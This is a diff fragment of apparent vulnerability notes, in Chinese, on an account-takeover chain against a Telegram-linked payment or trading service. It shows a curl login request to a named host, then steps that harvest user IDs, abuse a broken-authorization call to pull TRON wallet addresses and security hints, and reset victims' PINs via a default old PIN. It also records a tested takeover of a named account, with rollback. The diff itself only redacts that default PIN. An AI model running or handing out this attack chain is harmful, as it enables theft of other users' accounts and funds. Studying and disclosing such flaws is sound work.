@@ -26,7 +26,7 @@ curl -X POST "https://aliyun.xg805.com/api/gate/tgsdk/safe/login" \
   -H "Content-Type: application/json" \
   -d '{"init_data":"<initData>","bot_id":"5495837487","device_i
 登录 → ad/query 市场 → 收集 tg_id/user_id → get_verify_info(tg_id) 越权 → TRON 地址+安全提示
-change_pwd(user_id, old=123456, new=我的PIN) → 改掉对方 PIN → 账户归我控制
+change_pwd(user_id, old=[REDACTED], new=我的PIN) → 改掉对方 PIN → 账户归我控制
 实测 hk098888：接管(123456→654321) → 验证(654321生效) → 回滚(→123456)
 ```
 
